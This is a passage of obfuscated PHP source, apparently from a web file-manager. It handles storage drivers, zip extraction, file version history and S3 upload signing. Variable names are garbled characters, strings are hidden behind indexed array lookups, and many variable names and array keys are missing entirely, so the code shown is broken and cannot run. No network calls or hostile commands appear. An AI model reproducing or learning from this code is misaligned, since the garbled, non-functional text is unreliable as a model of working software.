KodIO::parse($Ã∂); if (!self::$driverListSystem) { $ÕÜ = Model($ÃÄ[807])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÕÜ, $ÃÄ[452]); } if ($Î¢Ö[$ÃÄ[43]] == KodIO::KOD_IO && !self::$driverListSystem[$Î¢Ö[$ÃÄ[452]]]) { return !1; } $Ã∂ = $Î¢Ö[$ÃÄ[1209]]; $Œ§ = self::driverGet($Î¢Ö, $Ã∂); return $Œ§; } private static function driverGet($‘ö, &$—Å) { $œ∑ =& $_SERVER[]; $‹Ü = $‘ö[$œ∑[1210]]; $—ç = $‘ö[$œ∑[452]]; switch ($‘ö[$œ∑[43]]) { case KodIO::KOD_IO: $Ô∫Ä = self::$driverListSystem[$—ç]; break; case KodIO::KOD_SOURCE: $—Å = $—ç . $—Å; $Ô∫Ä = array($œ∑[1211] => $œ∑[1212], $œ∑[16] => $‘ö); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÕÜ = $GLOBALS[$œ∑[1213]]; self::$driverListUser = array_to_keyvalue($ÕÜ, $œ∑[452]); } $Ô∫Ä = self::$driverListUser[$—ç]; break; case KodIO::KOD_SHARE_LINK: $Ô∫Ä = array($œ∑[1211] => $œ∑[1214], $œ∑[16] => $‘ö); $÷ïÃö = Action($œ∑[1215])->sharePathInfo($‘ö[$œ∑[94]]); $—Å = $÷ïÃö[$œ∑[191]]; if (!$÷ïÃö[$œ∑[191]]) { $ = Model($œ∑[641])->getInfo($÷ïÃö[$œ∑[642]]); $—Å = KodIO::clear($[$œ∑[1216]] . $‘ö[$œ∑[1209]]); $‘ö[$œ∑[537]] = $; $‘ö[$œ∑[1192]] = $—Å; $Ô∫Ä = array($œ∑[1211] => $œ∑[1217], $œ∑[16] => $‘ö); } break; case KodIO::KOD_SHARE_ITEM: $Ô∫Ä = array($œ∑[1211] => $œ∑[1218], $œ∑[16] => $‘ö); $ = Model($œ∑[641])->getInfo($‘ö[$œ∑[452]]); if ($[$œ∑[191]] == $œ∑[222]) { $—Å = KodIO::clear($[$œ∑[1216]] . $‘ö[$œ∑[1209]]); $‘ö[$œ∑[537]] = $; $‘ö[$œ∑[1192]] = $—Å; $Ô∫Ä = array($œ∑[1211] => $œ∑[1219], $œ∑[16] => $‘ö); } else { if (!$—Å) { $—Å = $[$œ∑[191]]; } } break; default: $—Å = $‘ö[$œ∑[94]]; $Ô∫Ä = array($œ∑[1211] => $œ∑[1220]); break; } $ = $‘ö[$œ∑[94]]; if (!isset(self::$driverCache[$])) { $€ë·´± = strtolower($Ô∫Ä[$œ∑[105]]); $À∑ = $GLOBALS[$œ∑[16]][$œ∑[99]][$œ∑[866]]; $ÔÅΩ = $œ∑[84] . (isset($À∑[$€ë·´±]) ? $À∑[$€ë·´±] : ucfirst($€ë·´±)); if (!class_exists($ÔÅΩ)) { show_json("{$ÔÅΩ}\x20\x6e\x6f\x74\40\145\x78\x69\x73\164\x73\41", !1); } $ = isset($Ô∫Ä[$œ∑[16]]) ? $Ô∫Ä[$œ∑[16]] : !1; self::$driverCache[$] = new $ÔÅΩ($); } $—ó = self::$driverCache[$]; $—ó->pathDriver = $‹Ü; $—ó->pathBase = $œ∑[22]; if (isset($Ô∫Ä[$œ∑[16]][$œ∑[1221]])) { $—ó->pathBase = rtrim($Ô∫Ä[$œ∑[16]][$œ∑[1221]], $œ∑[18]) . $œ∑[18]; $—Å = $—ó->pathBase . ltrim($—Å, $œ∑[18]); } $—Å = $—ó->getPath($—Å); if (isset($‘ö[$œ∑[1192]])) { $—Å = $‘ö[$œ∑[1192]]; } $—ó->path = $—Å; return $—ó; } public static function errorTips($»¨ = false) { $√° =& $_SERVER[]; static $…ë = array(); $ÌÖá = 1000; if ($»¨ === -1) { return $…ë ? $…ë[count($…ë) - 1] : $√°[22]; } if ($»¨ === !1) { return implode($√°[11], $…ë); } if (count($…ë) >= $ÌÖá) { $…ë = array_slice($…ë, $ÌÖá * 0.5, $ÌÖá); } $…ë[] = $»¨; write_log($√°[173] . ACTION . $√°[1222] . $»¨, $√°[1223]); } public static function getLastError($Ï©ì = '') { $Áπ≥ = self::errorTips(-1); return $Áπ≥ ? $Áπ≥ : $Ï©ì; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $; if ($) { return $; } $ = IO::init($_SERVER[][18]); return $; } private static function iconvSystem($Ãß’à) { return self::local()->iconvSystem($Ãß’à); } private static function iconvApp($Œî) { return self::local()->iconvApp($Œî); } public static function zipFolder($, $›πŸ¶ = "\172\x69\x70", $ = '', $≈ô = REPEAT_RENAME) { $ ö =& $_SERVER[]; $◊ô = IO::listPath($); if (!$◊ô) { return !1; } $◊ô = array_merge($◊ô[$ ö[92]], $◊ô[$ ö[93]]); return self::zip($◊ô, $›πŸ¶, $, $≈ô); } public static function zip($, $ = "\172\x69\160", $◊ó = '', $¬ñ = REPEAT_RENAME) { $”É =& $_SERVER[]; if (is_string($) && $) { $ = array(array($”É[94] => $)); } $—´ = self::init($[0][$”É[94]]); $∆á = self::info($[0][$”É[94]]); $»æ = $”É[22]; $»ï = $”É[22]; $›π = $”É[22]; if ($◊ó && substr($◊ó, -1, 1) != $”É[18]) { $»ï = get_path_father($◊ó); $›π = get_path_this($◊ó); } else { $»ï = self::pathFather($∆á[$”É[94]]); $›π = $∆á[$”É[42]] . $”É[20] . $; if (count($) > 1) { $ = IO::info($»ï); $›π = $[$”É[42]] . $”É[20] . $; } if ($◊ó) { $»ï = $◊ó; } } if ($—´->getType() == $”É[116]) { $Œì = self::init($»ï); $ƒ¨ = $Œì->getType() == $”É[116] ? $»ï : get_path_father($—´->path); $ƒ¨ = rtrim($ƒ¨, $”É[18]) . $”É[18]; mk_dir($ƒ¨); } else { $»æ = TEMP_FILES . $”É[1224] . time() . rand_string(8) . $”É[18]; mk_dir($»æ); file_put_contents($»æ . $”É[1225], $”É[22]); $ƒ¨ = $»æ; } $‹ñ = IO::info($ƒ¨); if (!$‹ñ || !$‹ñ[$”É[227]]) { show_json(LNG($”É[1226]), !1); } $’ï = self::zipFileList($, $»æ); foreach ($’ï as $≈π => $) { $’ï[$≈π] = self::iconvSystem($); } $≈Ä ã = get_filename_auto($ƒ¨ . $›π, $”É[22], $¬ñ); KodArchive::create(self::iconvSystem($≈Ä ã), $’ï); if (!IO::exist($≈Ä ã)) { if ($»æ) { del_dir($»æ); } show_json(LNG($”É[1227]), !1); } if (!$»æ) { return $≈Ä ã; } $⁄Ç = self::move($≈Ä ã, $»ï, $¬ñ); if ($»æ) { del_dir($»æ); } if (!$≈Ä ã) { show_json(LNG($”É[1227]), !1); } return $⁄Ç; } public static function unzip($ﬂ¥, $Õ∏‘≠, $Œù = "\x2d\x31", $Õ∫Ãò = "\162\x65\x70\154\x61\x63\x65") { $”£ =& $_SERVER[]; $≈≥‹Ø = parent::info($ﬂ¥); if (!$≈≥‹Ø) { show_json(LNG($”£[1228]), !1); } $Óáú = IO::infoFullSimple($Õ∏‘≠); if (!$Óáú) { $Õ∏‘≠ = IO::mkdir($Õ∏‘≠); } if (isset($Óáú[$”£[191]]) && trim($Óáú[$”£[94]], $”£[18]) != trim($Õ∏‘≠, $”£[18])) { $ = KodIO::make($Óáú[$”£[190]]); $ = IO::fileNameAuto($, $Óáú[$”£[42]], REPEAT_RENAME_FOLDER, !0); $Õ∏‘≠ = IO::mkdir($ . $); } $Œù = $Œù && $Œù != $”£[1229] ? @json_decode($Œù, !0) : -1; $’ê = self::unzipPart($ﬂ¥, $Œù); if (!$’ê || !IO::exist($’ê[$”£[224]])) { show_json(LNG($”£[115]), !1); } $Ÿ¨ = $’ê[$”£[1230]][count($’ê[$”£[1230]]) - 1]; if ($Ÿ¨[$”£[1231]] == -1 || substr($Ÿ¨[$”£[42]], -1, 1) == $”£[18]) { $√á = $’ê[$”£[1232]] . rand_string(10) . $”£[18]; mk_dir($√á); $«ë = count($’ê[$”£[1230]]) == 1 ? IO::ext($ﬂ¥) : get_path_ext($’ê[$”£[224]]); $€£ = KodArchive::extract(self::iconvSystem($’ê[$”£[224]]), $√á, $Ÿ¨[$”£[1231]], $, $«ë); self::unzipErrorCheck($€£, array($”£[1233], $ﬂ¥, $«ë, $Õ∏‘≠, $’ê)); Hook::trigger($”£[1234], $√á); recursion_dir($√á, $«õ, $Õê’á, 0); $ = array_merge($«õ, $Õê’á); $ = array(); foreach ($ as $) { $Ï§∞ = IO::move(self::iconvApp($), $Õ∏‘≠, $Õ∫Ãò); if ($Ï§∞) { $[] = $Ï§∞; } } del_dir($√á); } else { $Ï§∞ = IO::move($’ê[$”£[224]], $Õ∏‘≠, $Õ∫Ãò, get_path_this($Ÿ¨[$”£[42]])); if ($Ï§∞) { $[] = $Ï§∞; } } return $ ? $ : !1; } public static function unzipList($) { $ =& $_SERVER[]; $◊ë = isset($[$[1235]]) ? $[$[1235]] : !1; $Ã∫—∂ = isset($[$[1231]]) ? @json_decode($[$[1231]], !0) : -1; $ = self::unzipPart($[$[94]], $Ã∫—∂); if (!$ || !IO::exist($[$[224]])) { show_json(LNG($[115]), !1); } $∆° = $[$[1230]][count($[$[1230]]) - 1]; $¬î = in_array(IO::ext($[$[224]]), array($[366], $[1236], $[1237], $[1238], $[1239], $[1240])); if (!$◊ë && ($∆°[$[1231]] == -1 || $¬î)) { $ = $[$[1232]] . get_path_this($[$[224]]) . $[1241]; if (!IO::exist($)) { $∆øﬁê = $∆°[$[1231]] == -1 ? get_path_ext(IO::pathThis($[$[94]])) : get_path_ext($[$[224]]); $”ü = KodArchive::listContent(self::iconvSystem($[$[224]]), !0, $∆øﬁê); self::unzipErrorCheck($”ü, array($[1242], $, $)); @file_put_contents($, json_encode($”ü[$[1243]])); } return @json_decode(IO::getContent($), !0); } IO::fileOut($[$[224]], $◊ë, get_path_this($∆°[$[42]])); die; } private static function zipFileList($, $Ï∫≠ = false) { $œÉ =& $_SERVER[]; $‰∑≠ = array(); foreach ($ as $) { $ = $[$œÉ[94]]; if ($Ï∫≠) { $ = self::copy($[$œÉ[94]], $Ï∫≠, $œÉ[858]); } else { $ = self::init($[$œÉ[94]]); if ($->getType() == $œÉ[116]) { $ = $->path; } } if ($ && self::local()->exist($)) { $‰∑≠[$[$œÉ[94]]] = $; } } if (!empty($‰∑≠)) { return array_values($‰∑≠); } show_json(LNG($œÉ[1206]), !1); } private static function localFilePath($Ô∞â) { $ =& $_SERVER[]; $ = KodIO::parse($Ô∞â); if ($[$[43]] == KodIO::KOD_SOURCE) { $€á = Model($[865])->fileInfoGet(KodIO::sourceID($Ô∞â)); if (!$€á[$[94]]) { show_json($[1244], !1); } $Ô∞â = $€á[$[94]]; } $«æ÷≤ = self::init($Ô∞â); if ($«æ÷≤->pathParse[$[1192]]) { $Ô∞â = $«æ÷≤->pathParse[$[1192]]; $«æ÷≤ = self::init($Ô∞â); } $»â = $«æ÷≤->getType(); if ($»â == $[116] || $»â == $[1245]) { if (!$«æ÷≤->exist($«æ÷≤->path)) { show_json(LNG($[115]), !1); } return $«æ÷≤->path; } return !1; } public static function unzipPart($, $«£’ò = -1) { $ Ü =& $_SERVER[]; $ = IO::pathThis($); if (!$«£’ò || $«£’ò == -1) { $‘ê = array(array($ Ü[42] => $, $ Ü[1231] => -1)); $‘ê[0][$ Ü[1246]] = $‘ê[0][$ Ü[42]]; } else { if (is_array($«£’ò)) { $‘ê = $«£’ò; $«ä = count($‘ê) - 1; for ($œ´ = 0; $œ´ <= $«ä; $œ´++) { $Ë∑Ω = $‘ê[$œ´]; $ = get_path_this($Ë∑Ω[$ Ü[42]]) . (checkExtSafe($Ë∑Ω[$ Ü[42]]) ? $ Ü[22] : $ Ü[1247]); $‘ê[$œ´][$ Ü[1246]] = $ Ü[1248] . intval($Ë∑Ω[$ Ü[1231]]) . $ Ü[439] . $; if ($œ´ == 0) { continue; } $‘ê[$œ´][$ Ü[1246]] = $‘ê[$œ´ - 1][$ Ü[1246]] . $ Ü[1249] . $‘ê[$œ´][$ Ü[1246]]; } } } if (!is_array($‘ê) || count($‘ê) == 0) { return !1; } $ÔÖ© = $‘ê[count($‘ê) - 1]; if (!IO::exist($)) { return !1; } $ ± = TEMP_FILES . $ Ü[1250] . kodIO::hashPathSafe($) . $ Ü[18]; $ = $ ± . $ÔÖ©[$ Ü[1246]]; mk_dir($ ±); file_put_contents(TEMP_FILES . $ Ü[1225], $ Ü[22]); if (IO::exist($)) { return array($ Ü[224] => $, $ Ü[1230] => $‘ê, $ Ü[1232] => $ ±); } $ = self::localFilePath($); if (!$) { $ = $ ± . $ Ü[1251]; if (!IO::exist($)) { self::copy($, $ ±, !1, get_path_this($)); } } if (!$ || !IO::exist($)) { return !1; } if ($ÔÖ©[$ Ü[1231]] == -1) { return array($ Ü[224] => $, $ Ü[1230] => $‘ê, $ Ü[1232] => $ ±); } $›¶ = $; foreach ($‘ê as $œ´ => $Ë∑Ω) { if (!$Ë∑Ω || $Ë∑Ω[$ Ü[1231]] == $ Ü[1229]) { break; } if (substr($Ë∑Ω[$ Ü[42]], -1, 1) == $ Ü[18]) { break; } $–æ = in_array(get_path_ext($Ë∑Ω[$ Ü[1246]]), array($ Ü[366], $ Ü[1236], $ Ü[1237], $ Ü[1238], $ Ü[1239], $ Ü[1240])); $ﬁã = $œ´ == count($‘ê) - 1 && $–æ; $Âö¥ = $ ± . $Ë∑Ω[$ Ü[1246]]; $ = $ ± . get_path_this($Ë∑Ω[$ Ü[42]]); if (IO::exist($Âö¥)) { $›¶ = $Âö¥; continue; } $›å = $œ´ == 0 ? get_path_ext($) : get_path_ext($›¶); $√Ä≈ª = KodArchive::extract(self::iconvSystem($›¶), $ ±, $Ë∑Ω[$ Ü[1231]], $, $›å); self::unzipErrorCheck($√Ä≈ª, array($ Ü[1252], $, $‘ê, $Ë∑Ω, $Âö¥)); if (IO::exist($)) { IO::rename($, get_path_this($Âö¥)); } $›¶ = $Âö¥; } $ = $›¶; return array($ Ü[224] => $›¶, $ Ü[1230] => $‘ê, $ Ü[1232] => $ ±); } private static function unzipErrorCheck($, $ = false) { $¬ä =& $_SERVER[]; if ($[$¬ä[1253]]) { return !0; } write_log(array($¬ä[1254], $, $), $¬ä[1255]); show_json($¬ä[1256] . json_encode($[$¬ä[1243]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ =& $_SERVER[]; $◊Ä = $GLOBALS[$[16]][$[99]]; if ($◊Ä[$[1257]] != 1) { return; } if ($◊Ä[$[1258]] <= 0) { return; } if (isset($_REQUEST[$[1259]]) && $_REQUEST[$[1259]] == $[98]) { return; } Hook::bind($[1260], $[1261]); Hook::bind($[1262], $[1263]); Hook::bind($[1264], $[1265]); Hook::bind($[1266], $[1267]); Hook::bind($[1268], $[1269]); Hook::bind($[1270], $[1271]); } public static function eventBeforeUpload($‘∞) { if ($‘∞[3] && $‘∞[3] != REPEAT_REPLACE) { return; } $ = self::parsePath($‘∞[0]); if (!$) { return; } self::add($); } public static function eventBeforeEdit($) { $ • = self::parsePath($[0]); if (!$ •) { return; } self::add($ •); } public static function eventBeforeCopyFile($¬î’π, $, $Àù‰Åæ, $‘•, $»•, $Ó∫°) { $Ôóø =& $_SERVER[]; if (isset($Àù‰Åæ->_data[$Ôóø[1196]]) && $Àù‰Åæ->_data[$Ôóø[1196]]) { return; } $–∑ = $Àù‰Åæ->getPathOuter($‘•); $ = self::parsePath($–∑); if (!$) { return; } self::add($); } public static function eventBeforeRename($”•) { $∆π =& $_SERVER[]; $ = self::parsePath($”•[0]); if (!$) { return; } $ÕÇ = self::checkInHistory($); if (!$ÕÇ) { return; } if ($ÕÇ[$∆π[43]] == $∆π[224]) { $ = self::listData($); if ($ && $[$∆π[422]]) { self::moveHistory($, $”•[1]); } } else { IO::rename($ÕÇ[$∆π[94]], $”•[1]); } } public static function eventBeforeMove($ﬁì) { $ =& $_SERVER[]; $‚ôç = self::parsePath($ﬁì[0]); if (!$‚ôç) { return; } $ = self::parsePath($ﬁì[1]); if (!$) { return; } $≈à = $ﬁì[3]; $ = self::checkInHistory($‚ôç); if (!$) { return; } $ = self::pathHistory($); if ($[$[43]] == $[224]) { $—î = self::listData($‚ôç); $’º’¨ = rtrim($, $[18]) . $[18] . ($≈à ? $≈à : get_path_this($‚ôç)); $›ë = self::listData($’º’¨); if ($—î && $—î[$[422]] && $›ë && $›ë[$[422]]) { return self::clear($‚ôç); } if ($—î && $—î[$[422]]) { self::moveHistory($‚ôç, $≈à, $); } } else { IO::move($[$[94]], $, !1, $≈à); self::clearEmptyFolder(IO::pathFather($[$[94]])); } } public static function eventAfterRemove($ÃÑ, $∆æ) { $¬î =& $_SERVER[]; if (!$∆æ) { return; } $›ª = self::parsePath($ÃÑ[0]); if (!$›ª) { return; } $ƒ∞ = self::checkInHistory($›ª); if (!$ƒ∞) { return; } if ($ƒ∞[$¬î[43]] == $¬î[224]) { $‘å = self::listData($›ª, !1); if ($‘å && $‘å[$¬î[422]]) { self::clear($›ª, !1); } } else { IO::remove($ƒ∞[$¬î[94]]); self::clearEmptyFolder(IO::pathFather($ƒ∞[$¬î[94]])); } } private static function checkInHistory($Ÿµ) { $≈° = self::pathHistory($Ÿµ); if (!IO::exist($≈°)) { $≈° .= $_SERVER[][1272]; } return IO::exist($≈°) ? IO::info($≈°) : !1; } private static function parsePath($) { $ =& $_SERVER[]; if (!$) { return !1; } if ($GLOBALS[$[1273]]) { return; } $ £«π = KodIO::parse($); $œû = $ £«π[$[43]]; $ƒäÍõâ = !$œû || $œû == KodIO::KOD_IO || $œû == KodIO::KOD_SHARE_ITEM; if (!$ƒäÍõâ || !$ £«π[$[1274]]) { return !1; } if (substr($, 0, strlen(DATA_PATH . $[1275])) == DATA_PATH . $[1275]) { return !1; } if ($œû == KodIO::KOD_SHARE_ITEM) { $ÃÇ = IO::init($); if ($ÃÇ->pathParse[$[1192]]) { return self::parsePath($ÃÇ->pathParse[$[1192]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $[1276]); foreach ($ as $Œä) { if (!$œû && substr($, 0, strlen($Œä)) == $Œä) { return !1; } } self::log($GLOBALS[$[1187]] . $[1277] . $); return $; } private static function pathHistory($Àå) { $Òíâ•≈∑ =& $_SERVER[]; $–∂ = self::$_historyBase . ltrim(KodIO::clear($Àå), $Òíâ•≈∑[18]); $–∂ = str_replace(array($Òíâ•≈∑[1278]), array($Òíâ•≈∑[1279]), $–∂); return $–∂; } public static function log($√î) { } public static function historyCount($) { $„º© =& $_SERVER[]; $Áîç = array(); $›¥€£ = array(); foreach ($ as $‡æõ) { $€Ω = get_path_father($‡æõ); if (!$›¥€£[$€Ω]) { $›¥€£[$€Ω] = array(); } $›¥€£[$€Ω][] = get_path_this($‡æõ); } foreach ($›¥€£ as $€Ω => $‡©¶) { $ = self::parsePath($€Ω); if (!$) { continue; } foreach ($‡©¶ as $Á≥≤) { $‘Ω = self::listData(rtrim($, $„º©[18]) . $„º©[18] . $Á≥≤, !1); if ($‘Ω && $‘Ω[$„º©[422]]) { $Áîç[rtrim($€Ω, $„º©[18]) . $„º©[18] . $Á≥≤] = count($‘Ω[$„º©[422]]); } } } return $Áîç; } public static function add($‹ë) { $ =& $_SERVER[]; $…ä¬Ö = self::listData($‹ë); if (!$…ä¬Ö) { return; } $ = Model($[810])->get($[1280]); $»Å = $GLOBALS[$[16]][$[99]][$[1258]]; $ = $ == $[1281] ? min(5, $»Å) : $»Å; if ($»Å <= 0) { return; } $⁄µ = IO::info($‹ë); $ = $…ä¬Ö[$[422]]; if ($⁄µ[$[86]] == 0) { return; } if ($⁄µ[$[86]] >= 1024 * 1024 * 500) { return !1; } $≈Ü = IO::hashSimple($‹ë); if ($ && $[0][$[649]] == $≈Ü) { return !0; } if (array_key_exists($[227], $⁄µ) && !$⁄µ[$[227]]) { return !1; } $√ó = short_id(time()); $ = array($[452] => $√ó, $[649] => $≈Ü, $[42] => $⁄µ[$[42]] . $[20] . date($[1282]) . rand_string(1), $[86] => $⁄µ[$[86]], $[504] => USER_ID, $[225] => time(), $[1283] => $[22]); IO::mkdir($…ä¬Ö[$[1284]]); $ = IO::copy($‹ë, $…ä¬Ö[$[1284]], !1, $[$[42]]); if (!$) { self::clearEmptyFolder($…ä¬Ö[$[1284]]); return !1; } array_unshift($, $); if (count($) > $) { $»Ø = array_slice($, $); foreach ($»Ø as $‘•«¢) { IO::remove($…ä¬Ö[$[1284]] . $‘•«¢[$[42]]); } $ = array_slice($, 0, $); } return self::saveData($…ä¬Ö[$[1285]], $); } public static function remove($“ö, $ Ä) { $ =& $_SERVER[]; $ = self::listData($“ö); $÷ª = array(); if (!$) { return !1; } foreach ($[$[422]] as $’ç) { if ($’ç[$[452]] == $ Ä) { IO::remove($[$[1284]] . $’ç[$[42]]); continue; } $÷ª[] = $’ç; } return self::saveData($[$[1285]], $÷ª); } public static function clear($œ¶, $Ãì = true) { $«ß =& $_SERVER[]; $√∞ = self::listData($œ¶, $Ãì); if (!$√∞) { return !1; } foreach ($√∞[$«ß[422]] as $) { IO::remove($√∞[$«ß[1284]] . $[$«ß[42]]); } return self::saveData($√∞[$«ß[1285]], array()); } public static function moveHistory($Õá, $√ë = '', $…ã = '') { $€¨ =& $_SERVER[]; $ = self::listData($Õá, !1); if (!$ || !$[$€¨[422]]) { return !1; } $Ÿß = $€¨[1272]; $√ë = $√ë ? $√ë : get_path_this($Õá); $…ã = $…ã ? $…ã : $[$€¨[1284]]; $ = substr(get_path_this($[$€¨[1285]]), 0, -strlen($Ÿß)); foreach ($[$€¨[422]] as $ => $Ï´∏) { $ = $√ë . substr($Ï´∏[$€¨[42]], strlen($)); $ = IO::move($[$€¨[1284]] . $Ï´∏[$€¨[42]], $…ã, !1, $); if ($) { $[$€¨[422]][$][$€¨[42]] = $; } } $[$€¨[1285]] = IO::move($[$€¨[1285]], $…ã, !1, $√ë . $Ÿß); self::saveData($[$€¨[1285]], $[$€¨[422]]); self::clearEmptyFolder($[$€¨[1284]]); } public static function rollback($›®, $«ó) { $ƒ≠ =& $_SERVER[]; $ŒºŒ¥ = self::listData($›®); if (!$ŒºŒ¥) { return; } $⁄∑ = IO::info($›®); foreach ($ŒºŒ¥[$ƒ≠[422]] as $ => $) { if ($[$ƒ≠[452]] == $«ó) { self::add($›®); $≈∫ÀΩ = $ŒºŒ¥[$ƒ≠[1284]] . $[$ƒ≠[42]]; $ = IO::copy($≈∫ÀΩ, IO::pathFather($›®), REPEAT_REPLACE, $⁄∑[$ƒ≠[42]]); if ($) { self::remove($›®, $«ó); } return $; } } return !1; } public static function setDetail($, $, $Â∏ä) { $∆õ =& $_SERVER[]; $…∂ = self::listData($); if (!$…∂) { return; } foreach ($…∂[$∆õ[422]] as $ => $ﬂ§»¶) { if ($ﬂ§»¶[$∆õ[452]] == $) { $…∂[$∆õ[422]][$][$∆õ[1283]] = $Â∏ä; self::saveData($…∂[$∆õ[1285]], $…∂[$∆õ[422]]); return !0; } } return !1; } public static function fileInfo($, $Ôù´) { $»á =& $_SERVER[]; $ = self::listData($); if (!$) { show_json(LNG($»á[115]), !1); } $—Ñ = $»á[22]; foreach ($[$»á[422]] as $ => $) { if ($[$»á[452]] != $Ôù´) { continue; } $—Ñ = $[$»á[1284]] . $[$»á[42]]; break; } if (!$—Ñ) { show_json(LNG($»á[115]), !1); } return IO::info($—Ñ); } public static function fileOut($≈è, $‹â, $ = false) { $ =& $_SERVER[]; $›µ = self::fileInfo($≈è, $‹â); $‰û≥ËØÜ =& $GLOBALS[$[17]]; $ = isset($‰û≥ËØÜ[$[1235]]) && $‰û≥ËØÜ[$[1235]] == 1; if (isset($‰û≥ËØÜ[$[43]]) && $‰û≥ËØÜ[$[43]] == $[1286]) { return IO::fileOutImage($›µ[$[94]], $‰û≥ËØÜ[$[1287]]); } IO::fileOut($›µ[$[94]], $, get_path_this($≈è)); } public static function listData($, $ = true) { $⁄Ω =& $_SERVER[]; if ($ && !IO::exist($)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ = self::pathHistory($); $Ôïê = array($⁄Ω[1285] => $ . $⁄Ω[1272], $⁄Ω[1284] => rtrim(get_path_father($), $⁄Ω[18]) . $⁄Ω[18], $⁄Ω[422] => array()); $ = IO::getContent($Ôïê[$⁄Ω[1285]]); if ($) { $Œ±—ï = json_decode($, !0); if (is_array($Œ±—ï)) { $Ôïê[$⁄Ω[422]] = $Œ±—ï; } } return $Ôïê; } private static function saveData($„¥™, $‡¶í) { $⁄π =& $_SERVER[]; self::log($⁄π[1288] . $„¥™ . $⁄π[81] . count($‡¶í), $⁄π[791]); if ($‡¶í) { return IO::setContent($„¥™, json_encode($‡¶í)); } $Œ≠ = IO::pathFather($„¥™); IO::remove($„¥™); self::clearEmptyFolder($Œ≠); return !0; } public static function clearEmptyFolder($—™) { $ =& $_SERVER[]; if (trim($—™, $[18]) == trim(self::$_historyBase, $[18])) { return; } $ = IO::pathFather($—™); $Ïπä = IO::has($—™, !0); if ($Ïπä[$[233]] > 0 || $Ïπä[$[234]] > 0) { return; } IO::remove($—™); self::clearEmptyFolder($); } private static function getBasePath() { $ =& $_SERVER[]; $ = Model($[1289])->get($[1290]); if ($) { if (!IO::exist($)) { IO::mkdir($); } if (get_path_this($) == $[1275]) { $‡∏® = $[1291] . rand_string(8); @rename($, get_path_father($) . $[18] . $‡∏®); $ = DATA_PATH . $‡∏® . $[18]; file_put_contents(DATA_PATH . $[1225], $[22]); Model($[1289])->set($[1290], $); } return $; } $ = DATA_PATH . $[1291] . rand_string(8) . $[18]; $ = IO::mkdir($); $ = rtrim($, $[18]) . $[18]; file_put_contents($ . $[1225], $[22]); file_put_contents(DATA_PATH . $[1225], $[22]); Model($[1289])->set($[1290], $); return $; } } goto B; dÌç´: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($·∑å) { parent::__construct($·∑å); } public function uploadFormData($ﬁî«ä, $Èå™ = 3600) { $ =& $_SERVER[]; $Óúã = $[223]; $ = $[262]; $ = $[72]; $ƒí = gmdate($[263]); $ÍæÄ = gmdate($[264]); $ = $[265]; $ = $Èå™ . $[22]; $ = $[266]; $∆≤ = array($this->accessKey, $ÍæÄ, $this->region, $, $); $ÿ´–æ = implode($[18], $∆≤); $Œä = array($[267] => gmdate($[1365], strtotime($[269])), $[270] => array(array($[271] => $this->bucket), array($[272] => $Óúã), array($[273], $[274], $[22]), array($[273], $[275], $[22]), array($[273], $[276], $[22]), array($[277] => $), array($[278] => $ÿ´–æ), array($[279] => $), array($[280] => $ƒí), array($[281] => $))); $∆† = base64_encode(json_encode($Œä)); $ÃÉ = hash_hmac($[282], $ÍæÄ, $[283] . $this->secret, !0); $—ô = hash_hmac($[282], $this->region, $ÃÉ, !0); $—ø = hash_hmac($[282], $, $—ô, !0); $—¨ = hash_hmac($[282], $, $—ø, !0); $ = hash_hmac($[282], $∆†, $—¨); $‹¢ = array($[240] => $[22], $[284] => $[22], $[272] => $Óúã, $[277] => $, $[285] => $∆†, $[286] => $ÿ´–æ, $[287] => $, $[288] => $ƒí, $[289] => $, $[290] => $, $[206] => $this->getHost()); return $‹¢; } public function multiUploadFormData($Óã†, $€£ÂÑ¨ = 3600) { $ =& $_SERVER[]; $ = gmdate($[1468]); $ = array(); $ = $this->client->getUploadId($this->bucket, $Óã†, $); if (!$) { return !1; } return array($[248] => $, $[206] => $this->getHost() . $[18] . $this->pathEncode($Óã†), $[249] => $, $[104] => $Óã†); } public function multiUploadAuthData($œì, $≈ï = array()) { $ =& $_SERVER[]; $ = isset($≈ï[$[185]]) ? $≈ï[$[185]] : $[22]; $ = $≈ï[$[104]]; unset($≈ï[$[104]]); if (isset($≈ï[$[250]])) { return $this->listUploadParts($, $≈ï); } $”≥ = array(); if (isset($≈ï[$[1469]])) { $”≥[$[1470]] = $≈ï[$[1469]]; } $»ôŒÖ = explode($[208], $this->getHost()); $œ∫ = array($[1471] => $»ôŒÖ[1], $[1472] => $[22], $[240] => $[130], $[284] => $≈ï[$[86]]); $ = $[253]; $‚ª≤ = $[18] . $this->pathEncode($) . $; $Àê = $this->client->__getSignatureV4($”≥, $œ∫, $, $‚ª≤); if (strpos($, $[252]) === 0) { if (isset($”≥[$[1470]])) { $Ãπ = $”≥[$[1470]]; } else { if (isset($Àê[$[1470]])) { $Ãπ = $Àê[$[1470]]; } else { $Ãπ = hash($[282], $[22]); } } return array($[258] => $Àê[$[258]], $[1470] => $Ãπ, $[249] => $Àê[$[1473]]); } return $Àê[$[258]]; } public function listUploadParts($, $ = array()) { $›• =& $_SERVER[]; $ = str_replace($›•[259], $›•[22], $[$›•[185]]); $¬Ç = $this->client->listParts($this->bucket, $, $); if (!$¬Ç) { return !1; } $ﬁ© = $›•[1474]; foreach ($¬Ç as $Õé) { $ﬁ© .= $›•[1475] . "\x3c\120\x61\x72\164\116\x75\155\x62\145\x72\x3e{$Õé[$›•[1430]]}\74\x2f\x50\141\x72\164\x4e\165\155\x62\x65\162\76\xa" . "\x3c\105\x54\x61\x67\76{$Õé[$›•[1431]]}\74\57\x45\x54\141\x67\76\12" . $›•[1476]; } $ﬁ© .= $›•[1477]; $‘´ = array(); $ƒã = explode($›•[208], $this->getHost()); $Ãô = array($›•[1471] => $ƒã[1], $›•[240] => $›•[130], $›•[284] => strlen($ﬁ©)); $ = $›•[251]; $ÿê = $›•[18] . $this->pathEncode($) . $[$›•[185]]; $ = $this->client->__getSignatureV4($‘´, $Ãô, $, $ÿê, $ﬁ©); return array($›•[258] => $[$›•[258]], $›•[249] => $[$›•[1473]], $›•[260] => $¬Ç, 